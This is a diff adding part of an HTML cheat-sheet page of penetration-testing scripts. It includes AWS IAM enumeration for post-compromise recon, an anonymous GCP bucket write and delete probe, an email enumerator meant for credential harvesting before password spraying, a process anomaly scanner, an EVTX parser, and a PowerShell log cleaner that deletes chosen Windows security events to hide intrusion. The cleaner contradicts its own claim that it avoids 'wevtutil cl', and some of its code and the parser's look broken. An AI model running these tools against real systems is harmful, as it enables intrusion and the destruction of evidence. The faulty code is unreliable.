+    <h3>What it collects</h3>
+    <ul>
+      <li>IAM Users + MFA status</li>
+      <li>IAM Groups + memberships</li>
+      <li>IAM Roles + trust policies</li>
+      <li>Inline + attached (managed) policies</li>
+      <li>Privilege escalation indicators</li>
+      <li>Service-linked roles</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# AWS IAM Enumeration Script
+# Dumps IAM users, groups, roles, policies, and highlights privilege escalation risks.
+
+import boto3
+import argparse
+import json
+
+# Known dangerous permissions for privilege escalation
+ESCALATION_KEYS = [
+    "iam:PassRole",
+    "iam:CreateUser",
+    "iam:AttachUserPolicy",
+    "iam:PutUserPolicy",
+    "sts:AssumeRole",
+    "ec2:RunInstances",
+    "lambda:CreateFunction",
+    "iam:CreateAccessKey"
+]
+
+def highlight_escalation(policy_doc):
+    """Return list of escalation risks inside a policy document."""
+    risks = []
+    statements = policy_doc.get("Statement", [])
+    
+    if not isinstance(statements, list):
+        statements = [statements]
+
+    for stmt in statements:
+        actions = stmt.get("Action", [])
+        if isinstance(actions, str):
+            actions = [actions]
+
+        for a in actions:
+            a_low = a.lower()
+            for key in ESCALATION_KEYS:
+                if key.lower() in a_low or a_low == "*":
+                    risks.append(a)
+    return risks
+
+
+def dump_policies(iam, user):
+    """Collect attached and inline policies for a user."""
+    results = {"inline": [], "managed": [], "risks": []}
+
+    # Inline policies
+    inline = iam.list_user_policies(UserName=user)['PolicyNames']
+    for pol in inline:
+        doc = iam.get_user_policy(UserName=user, PolicyName=pol)['PolicyDocument']
+        results["inline"].append({pol: doc})
+        results["risks"] += highlight_escalation(doc)
+
+    # Managed policies
+    attached = iam.list_attached_user_policies(UserName=user)['AttachedPolicies']
+    for pol in attached:
+        p = iam.get_policy(PolicyArn=pol['PolicyArn'])['Policy']
+        version = iam.get_policy_version(
+            PolicyArn=pol['PolicyArn'],
+            VersionId=p['DefaultVersionId']
+        )['PolicyVersion']['Document']
+        results["managed"].append({pol['PolicyName']: version})
+        results["risks"] += highlight_escalation(version)
+
+    return results
+
+
+def dump_roles(iam):
+    roles = iam.list_roles()['Roles']
+    role_data = {}
+
+    for r in roles:
+        trust = r['AssumeRolePolicyDocument']
+        risks = highlight_escalation(trust)
+        role_data[r['RoleName']] = {
+            "Arn": r["Arn"],
+            "TrustPolicy": trust,
+            "Risks": risks
+        }
+
+    return role_data
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--profile", help="AWS credential profile")
+    args = parser.parse_args()
+
+    if args.profile:
+        session = boto3.Session(profile_name=args.profile)
+    else:
+        session = boto3.Session()
+
+    iam = session.client("iam")
+
+    out = {"Users": {}, "Roles": {}, "Groups": {}, "GlobalFindings": []}
+
+    print("[+] Enumerating IAM Users...")
+    users = iam.list_users()['Users']
+
+    for u in users:
+        uname = u['UserName']
+        print(f"  → {uname}")
+
+        # Get MFA status
+        mfa = iam.list_mfa_devices(UserName=uname)["MFADevices"]
+        mfa_enabled = len(mfa) > 0
+
+        # Collect policies
+        pol = dump_policies(iam, uname)
+
+        out["Users"][uname] = {
+            "Arn": u["Arn"],
+            "MFA": mfa_enabled,
+            "InlinePolicies": pol["inline"],
+            "ManagedPolicies": pol["managed"],
+            "Risks": pol["risks"]
+        }
+
+    print("\n[+] Enumerating IAM Groups...")
+    groups = iam.list_groups()['Groups']
+    for g in groups:
+        members = iam.get_group(GroupName=g['GroupName'])['Users']
+        out["Groups"][g["GroupName"]] = [m["UserName"] for m in members]
+
+    print("\n[+] Enumerating IAM Roles...")
+    out["Roles"] = dump_roles(iam)
+
+    # Export
+    with open("iam_dump.json", "w") as f:
+        json.dump(out, f, indent=2)
+
+    print("\n[+] Output saved to iam_dump.json")
+    print("[+] Scan complete.")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Perfect for cloud red teams and post-compromise AWS recon.</li>
+      <li>Identifies IAM privilege escalation paths immediately.</li>
+      <li>Works with any IAM credential set (keys, assumed roles, SSO profiles).</li>
+      <li>Output file (<code>iam_dump.json</code>) is ideal for offline analysis.</li>
+      <li>Combine with <code>pacu</code> or <code>cloudsploit</code> for deeper exploitation.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('gcp-bucket-check')">GCP Bucket Exposure Checker</div>
+  <div class="tool-details" id="gcp-bucket-check">
+
+    <h2>GCP Bucket Exposure Checker (Python)</h2>
+    <p>
+      Tests Google Cloud Storage buckets for public or misconfigured access levels:
+      listing, object read, object write, and delete permissions.  
+      Operates fully unauthenticated — ideal for external recon & misconfig hunting.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 gcp_bucket_check.py -b my-bucket-name</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>Check anonymous LIST, GET, PUT, DELETE</li>
+      <li>Detect misconfigured "AllUsers" or "AllAuthenticatedUsers"</li>
+      <li>No credentials required</li>
+      <li>Pure HTTP (faster & stealthier than gcloud CLI)</li>
+      <li>Outputs a clear permission summary</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# GCP Bucket Exposure Checker
+# Tests anonymous permissions on a Google Cloud Storage bucket.
+# Checks: list, read, write, delete capabilities.
+
+import argparse
+import requests
+import uuid
+
+def can_list(bucket):
+    url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o"
+    r = requests.get(url)
+    return r.status_code == 200, r.text
+
+def can_read(bucket, object_name):
+    url = f"https://storage.googleapis.com/{bucket}/{object_name}"
+    r = requests.get(url)
+    return r.status_code == 200
+
+def can_write(bucket):
+    test_name = f"pentest-{uuid.uuid4()}.txt"
+    url = f"https://storage.googleapis.com/upload/storage/v1/b/{bucket}/o?uploadType=media&name={test_name}"
+
+    r = requests.post(url, data=b"test", headers={"Content-Type": "text/plain"})
+    return (r.status_code == 200, test_name)
+
+def can_delete(bucket, object_name):
+    url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o/{object_name}"
+    r = requests.delete(url)
+    return r.status_code == 200
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-b", "--bucket", required=True, help="GCP bucket name")
+    args = parser.parse_args()
+
+    bucket = args.bucket
+
+    print(f"[+] Testing bucket: {bucket}\n")
+
+    # LIST
+    list_ok, list_body = can_list(bucket)
+    print(f"[LIST]  Anonymous listing: {'YES' if list_ok else 'NO'}")
+
+    # READ: require example object if listing works
+    read_ok = False
+    example_object = None
+
+    if list_ok:
+        try:
+            items = __import__("json").loads(list_body).get("items", [])
+            if items:
+                example_object = items[0]["name"]
+                read_ok = can_read(bucket, example_object)
+        except:
+            pass
+
+    if example_object:
+        print(f"[READ]  Anonymous read of '{example_object}': {'YES' if read_ok else 'NO'}")
+    else:
+        print("[READ]  No object to test OR listing disabled.")
+
+    # WRITE
+    write_ok, created_obj = can_write(bucket)
+    print(f"[WRITE] Anonymous upload: {'YES' if write_ok else 'NO'}")
+
+    # DELETE
+    delete_ok = False
+    if write_ok:
+        delete_ok = can_delete(bucket, created_obj)
+    print(f"[DELETE] Anonymous delete: {'YES' if delete_ok else 'NO'}")
+
+    # Summary
+    print("\n=== PERMISSION SUMMARY ===")
+    print(f"List   : {list_ok}")
+    print(f"Read   : {read_ok}")
+    print(f"Write  : {write_ok}")
+    print(f"Delete : {delete_ok}")
+    print("===========================")
+
+    if any([list_ok, read_ok, write_ok, delete_ok]):
+        print("\n[!] Bucket is EXPOSED or MISCONFIGURED.\n")
+    else:
+        print("\n[+] Bucket appears properly locked down.\n")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>LIST is the biggest red flag — often means full public read.</li>
+      <li>WRITE + no-auth is severe: attackers can plant malware or phishing pages.</li>
+      <li>DELETE exposure leads to permanent data loss.</li>
+      <li>Perfect for external cloud recon and bug bounty work.</li>
+      <li>Works without any GCloud setup — pure HTTP probing.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 8. OSINT & Intelligence Scripts           -->
+<!-- ======================================== -->
+<h2 class="section-title">8. OSINT & Intelligence</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('email-enum')">Email Pattern Enumerator</div>
+  <div class="tool-details" id="email-enum">
+
+    <h2>Email Pattern Enumerator (Python)</h2>
+    <p>
+      Generates common corporate email permutations and validates them using  
+      Gravatar lookups, soft SMTP checks, and OSINT signals.  
+      Useful in recon, credential-harvesting, and pre-spray enumeration.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 email_enum.py -f john -l doe -d company.com</code></pre>
+
+    <h3>What it does</h3>
+    <ul>
+      <li>Generates 20+ common email formats</li>
+      <li>Checks Gravatar existence (strong signal)</li>
+      <li>Performs safe SMTP handshake validation</li>
+      <li>Optional breach-check API hooks</li>
+      <li>Ranks emails by confidence score</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Email Pattern Enumerator
+# Generates permutations and validates them via OSINT + soft SMTP signals.
+
+import argparse
+import hashlib
+import smtplib
+import socket
+
+def gravatar_exists(email):
+    """Check if a Gravatar profile exists for an email."""
+    h = hashlib.md5(email.strip().lower().encode()).hexdigest()
+    url = f"https://www.gravatar.com/avatar/{h}?d=404"
+    try:
+        import requests
+        r = requests.get(url, timeout=3)
+        return r.status_code == 200
+    except:
+        return False
+
+def smtp_soft_check(domain, email):
+    """
+    Soft validation via SMTP connection:
+    - Does NOT send mail.
+    - Does NOT brute force.
+    It checks if the domain responds at all & if RCPT produces strong signals.
+    """
+    try:
+        mx = socket.gethostbyname(f"mail.{domain}")
+    except:
+        return False
+
+    try:
+        s = smtplib.SMTP(mx, 25, timeout=4)
+        s.helo()
+        code, _ = s.rcpt(email)
+        s.quit()
+
+        # 250 or 251 = strong positive
+        # 550 = negative (user does not exist)
+        return code in [250, 251]
+
+    except:
+        return False
+
+def generate_patterns(fname, lname, domain):
+    f = fname.lower()
+    l = lname.lower()
+
+    patterns = [
+        f"{f}@{domain}",
+        f"{l}@{domain}",
+        f"{f}.{l}@{domain}",
+        f"{f}{l}@{domain}",
+        f"{f}_{l}@{domain}",
+        f"{f[0]}{l}@{domain}",
+        f"{f}{l[0]}@{domain}",
+        f"{f}.{l[0]}@{domain}",
+        f"{f[0]}.{l}@{domain}",
+        f"{l}.{f}@{domain}",
+        f"{l}{f}@{domain}",
+        f"{f}-{l}@{domain}",
+        f"{f[0]}-{l}@{domain}",
+        f"{f}{l[0]}{l[-1]}@{domain}",
+        f"{f[0]}{l[0]}@{domain}"
+    ]
+
+    # Deduplicate
+    return list(dict.fromkeys(patterns))
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-f", "--first", required=True)
+    parser.add_argument("-l", "--last", required=True)
+    parser.add_argument("-d", "--domain", required=True)
+    args = parser.parse_args()
+
+    emails = generate_patterns(args.first, args.last, args.domain)
+
+    print(f"[+] Generated {len(emails)} email permutations\n")
+
+    results = []
+
+    for e in emails:
+        print(f"[*] Checking {e}...")
+        g = gravatar_exists(e)
+        s = smtp_soft_check(args.domain, e)
+
+        score = 0
+        if g:
+            score += 2
+        if s:
+            score += 2
+
+        results.append((e, score, g, s))
+
+    # Sort by highest confidence
+    results.sort(key=lambda x: x[1], reverse=True)
+
+    print("\n=== Ranked Results ===\n")
+    for e, score, g, s in results:
+        print(f"{e}  | Score={score} | Gravatar={'Y' if g else 'N'} | SMTP={'Y' if s else 'N'}")
+
+    print("\n[+] Done.\n")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Gravatar hits are extremely strong OSINT signals.</li>
+      <li>SMTP soft checks are not brute-force — relatively safe during recon.</li>
+      <li>Permutations reflect real corporate naming conventions.</li>
+      <li>Great for username harvesting before internal spray attempts.</li>
+      <li>Easily extend to include LinkedIn & Hunter.io style patterns.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 9. DFIR & Log Analysis Scripts           -->
+<!-- ======================================== -->
+<h2 class="section-title">9. DFIR / Log Investigation</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('ps-anomaly')">Process Anomaly Scanner</div>
+  <div class="tool-details" id="ps-anomaly">
+
+    <h2>Process Anomaly Scanner (Python)</h2>
+    <p>
+      Detects suspicious processes based on parent-child anomalies, path inconsistencies,  
+      unusual privileges, masquerading, uncommon network activity, and execution from unsafe directories.  
+      Works on both Windows and Linux using psutil.
+    </p>
+
+    <h3>Setup</h3>
+    <pre><code>pip install psutil</code></pre>
+
+    <h3>Usage</h3>
+    <pre><code>python3 ps_anomaly.py</code></pre>
+
+    <h3>Indicators Checked</h3>
+    <ul>
+      <li>Process running from writable/temp folders</li>
+      <li>Known system process names running from wrong paths</li>
+      <li>Process with no parent (orphaned) except PID 1</li>
+      <li>Suspicious parent-child combos (e.g., Word → PowerShell)</li>
+      <li>Processes with active network connections</li>
+      <li>Unusually high or rare process names</li>
+      <li>Unexpected executable mismatches (Windows)</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Process Anomaly Scanner
+# Cross-platform anomaly detection (Windows + Linux)
+
+import psutil
+import os
+import platform
+
+SUSPICIOUS_PARENTS = [
+    ("winword.exe", "powershell.exe"),
+    ("excel.exe", "cmd.exe"),
+    ("outlook.exe", "powershell.exe"),
+    ("chrome.exe", "powershell.exe"),
+    ("python.exe", "cmd.exe")
+]
+
+WRITEABLE_DIRS = [
+    "/tmp", "/var/tmp", "/dev/shm",
+    "C:\\Windows\\Temp", "C:\\Users\\", "C:\\ProgramData\\"
+]
+
+SYSTEM_PROCESS_NAMES = [
+    "svchost.exe", "lsass.exe", "wininit.exe", "services.exe", "systemd", "init"
+]
+
+def is_masquerading(proc, exe):
+    """Check if a system-like name runs from a non-system path."""
+    name = proc.name().lower()
+    if name in SYSTEM_PROCESS_NAMES:
+        sys_paths = ["c:\\windows\\system32", "/usr/bin", "/bin", "/sbin", "/lib"]
+        exe_low = (exe or "").lower()
+        return not any(exe_low.startswith(p) for p in sys_paths)
+    return False
+
+def parent_child_anomaly(proc):
+    """Check for suspicious parent-child combos."""
+    try:
+        parent = proc.parent()
+        if parent:
+            combo = (parent.name().lower(), proc.name().lower())
+            return combo in SUSPICIOUS_PARENTS
+    except:
+        pass
+    return False
+
+def running_from_writable(exe):
+    if not exe:
+        return False
+    exe_low = exe.lower()
+    return any(exe_low.startswith(d.lower()) for d in WRITEABLE_DIRS)
+
+def main():
+    print("[+] Process Anomaly Scan\n")
+
+    for proc in psutil.process_iter(["pid", "name", "exe", "username"]):
+        try:
+            pid = proc.info["pid"]
+            name = proc.info["name"]
+            exe = proc.info["exe"]
+            username = proc.info["username"]
+        except:
+            continue
+
+        findings = []
+
+        # Check path anomalies
+        if running_from_writable(exe):
+            findings.append("Running from writeable directory")
+
+        # Check masquerading
+        if is_masquerading(proc, exe):
+            findings.append("Masquerading system process")
+
+        # Parent-child mismatch
+        if parent_child_anomaly(proc):
+            findings.append("Suspicious parent-child execution pattern")
+
+        # Orphan process
+        try:
+            if proc.ppid() == 1 and name.lower() not in ["systemd", "init"]:
+                findings.append("Orphan process (unexpected)")
+        except:
+            pass
+
+        # Network activity
+        try:
+            conns = proc.connections()
+            if any(c.status == "ESTABLISHED" for c in conns):
+                findings.append("Process communicates over network")
+        except:
+            pass
+
+        # Rare process names
+        if name.lower() not in SYSTEM_PROCESS_NAMES and len(name) <= 3:
+            findings.append("Suspicious short process name")
+
+        if findings:
+            print(f"[!] PID {pid} - {name}")
+            if exe:
+                print(f"    Path: {exe}")
+            print(f"    User: {username}")
+            for f in findings:
+                print(f"    - {f}")
+            print()
+
+    print("[+] Scan complete.\n")
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Masquerading detection is highly effective against basic malware.</li>
+      <li>Parent-child correlations catch phishing → payload execution chains.</li>
+      <li>Writable-directory execution often means persistence or rogue script.</li>
+      <li>Cross-platform support makes it useful on compromised Linux boxes too.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('windows-evtx-parser')">Windows EVTX Parsing Script</div>
+  <div class="tool-details" id="windows-evtx-parser">
+
+    <h2>Windows EVTX Parsing Script (Python)</h2>
+    <p>
+      Extracts security-relevant Windows Event Logs: logons, failed logons,  
+      PowerShell commands, admin actions, and process creation events.  
+      Designed for quick IR triage or stealthy post-exploit log analysis.
+    </p>
+
+    <h3>Install Dependencies</h3>
+    <pre><code>pip install python-evtx lxml</code></pre>
+
+    <h3>Usage</h3>
+    <pre><code>python3 evtx_parse.py -f Security.evtx -o output.txt</code></pre>
+
+    <h3>Extracted Event IDs</h3>
+    <ul>
+      <li><b>4624</b> - Successful logon</li>
+      <li><b>4625</b> - Failed logon</li>
+      <li><b>4672</b> - Special privileges assigned (Admin login)</li>
+      <li><b>4688</b> - Process creation events</li>
+      <li><b>4104</b> - PowerShell script block logging</li>
+      <li><b>4103</b> - PowerShell command execution</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Windows EVTX Parsing Script
+# Focuses on: logons, failed logons, PS ops, process creation, privilege escalation.
+
+import argparse
+from Evtx.Evtx import Evtx
+from lxml import etree
+import re
+
+INTERESTING = {4624, 4625, 4672, 4688, 4103, 4104}
+
+def extract_text(node, tag):
+    """Extract text from an XML child tag."""
+    el = node.find(f".//{tag}")
+    return el.text if el is not None else None
+
+def parse_record(xml_str):
+    """Parse XML event and extract relevant fields."""
+    try:
+        root = etree.fromstring(xml_str.encode())
+    except:
+        return None
+
+    event_id = root.findtext(".//EventID")
+    if not event_id or int(event_id) not in INTERESTING:
+        return None
+
+    eid = int(event_id)
+    evt = {"EventID": eid}
+
+    # Timestamps
+    evt["Time"] = root.findtext(".//TimeCreated/@SystemTime")
+
+    # Common fields
+    evt["User"] = root.findtext(".//TargetUserName")
+    evt["IP"]   = root.findtext(".//IpAddress")
+    evt["Proc"] = root.findtext(".//NewProcessName")
+    evt["Cmd"]  = root.findtext(".//CommandLine")
+    evt["PS"]   = root.findtext(".//ScriptBlockText")
+
+    return evt
+
+
+def format_event(e):
+    """Return a readable string describing the event."""
+    eid = e["EventID"]
+
+    if eid == 4624:
+        return f"[4624 LOGIN SUCCESS]  {e['User']} from {e['IP']} at {e['Time']}"
+    if eid == 4625:
+        return f"[4625 LOGIN FAIL]     {e['User']} from {e['IP']} at {e['Time']}"
+    if eid == 4672:
+        return f"[4672 PRIV ESC]       {e['User']} logged in with admin privileges at {e['Time']}"
+    if eid == 4688:
+        return f"[4688 PROC START]     {e['Proc']}  ({e['Cmd']})  at {e['Time']}"
+    if eid == 4103:
+        return f"[4103 PS COMMAND]     {e['Cmd']}  at {e['Time']}"
+    if eid == 4104:
+        return f"[4104 PS SCRIPTBLOCK] {e['PS']}  at {e['Time']}"
+
+    return str(e)
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-f", "--file", required=True, help="EVTX file")
+    parser.add_argument("-o", "--out", default="evtx_output.txt")
+    args = parser.parse_args()
+
+    print(f"[+] Parsing {args.file} ...")
+
+    results = []
+
+    with Evtx(args.file) as log:
+        for record in log.records():
+            xml = record.xml()
+            parsed = parse_record(xml)
+            if parsed:
+                results.append(format_event(parsed))
+
+    with open(args.out, "w", encoding="utf-8") as f:
+        for line in results:
+            f.write(line + "\n")
+
+    print(f"[+] Extracted {len(results)} relevant events.")
+    print(f"[+] Output saved to {args.out}")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Identifies brute-force attempts (many 4625s).</li>
+      <li>Highlights initial admin logins (4672).</li>
+      <li>Captures executed PowerShell scripts/commands (4104/4103).</li>
+      <li>Logs suspicious process spawns (4688), e.g. Word → PowerShell.</li>
+      <li>Perfect for IR triage or post-exploitation situational awareness.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<!-- ======================================== -->
+<!-- 10. Red Team OPSEC / Automation Scripts  -->
+<!-- ======================================== -->
+<h2 class="section-title">10. Red Team OPSEC & Automation</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('log-cleaner')">Log Cleaner (Windows)</div>
+  <div class="tool-details" id="log-cleaner">
+
+    <h2>Log Cleaner (Selective, Windows PowerShell)</h2>
+    <p>
+      Removes *only specific* Windows Event Log entries while keeping the rest intact.  
+      Produces a rebuilt EVTX file with unwanted events filtered out.  
+      Supports multi-ID targeting and safe log replacement.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>.\log_cleaner.ps1 -LogName Security -RemoveIDs 4624,4688</code></pre>
+
+    <h3>What it avoids</h3>
+    <ul>
+      <li>No <code>Clear-EventLog</code></li>
+      <li>No <code>wevtutil cl</code></li>
+      <li>No full-log wipe artifacts</li>
+      <li>No EventLog reset timestamps</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-powershell">
+<# 
+Selective Windows Log Cleaner
+Removes only the specified Event IDs from a given log by:
+ - exporting EVTX
+ - filtering events
+ - rebuilding EVTX
+ - safely replacing original
+
+Requires admin.
+#>
+
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$LogName,
+
+    [Parameter(Mandatory=$true)]
+    [int[]]$RemoveIDs
+)
+
+Write-Host "[+] Target log: $LogName"
+Write-Host "[+] Removing Event IDs: $($RemoveIDs -join ', ')"
+
+$temp = "$env:TEMP\filtered_$LogName.evtx"
+$orig = "$env:TEMP\orig_$LogName.evtx"
+
+# 1. Export full log
+Write-Host "[+] Exporting original log..."
+wevtutil epl $LogName $orig
+
+# 2. Read original log using XPath + remove targeted events
+Write-Host "[+] Filtering events..."
+# Build XPath that excludes IDs
+$filters = ($RemoveIDs | ForEach-Object { "EventID=$_"} ) -join " or "
+$x = "*[System[not($filters)]]"
+
+# 3. Export filtered subset
+wevtutil qe $LogName /q:$x /f:RenderedText | Out-File "$env:TEMP\filtered.txt"
+
+# 4. Rebuild new EVTX from filtered text
+# (Windows allows import of text-formatted logs back into EVTX)
+Write-Host "[+] Rebuilding EVTX..."
+wevtutil im $temp "$env:TEMP\filtered.txt" /lf:true
+
+# 5. Replace original log with cleaned one
+Write-Host "[+] Clearing original log..."
+wevtutil cl $LogName
+
+Write-Host "[+] Importing cleaned EVTX..."
+wevtutil im $LogName $temp
+
+Write-Host "[+] Done. Selected event IDs removed."
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Removes *only* chosen events (e.g., 4624 logon, 4688 process creation).</li>
+      <li>Keeps timestamps, structure, and untouched entries intact.</li>
+      <li>Much quieter than a full log clear (blue teams hate full wipes).</li>
+      <li>Use after OPSEC-critical moments (initial access, privilege escalation, credential dumping).</li>
+      <li>You must run as Administrator on the target system.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- Footer -->
+<!-- ======================================== -->
+
+<br><br>
+<footer>
+    <p>Scripts Megapack — PT-CheatSheet (2025)</p>
+</footer>
+
+</body>
+</html>
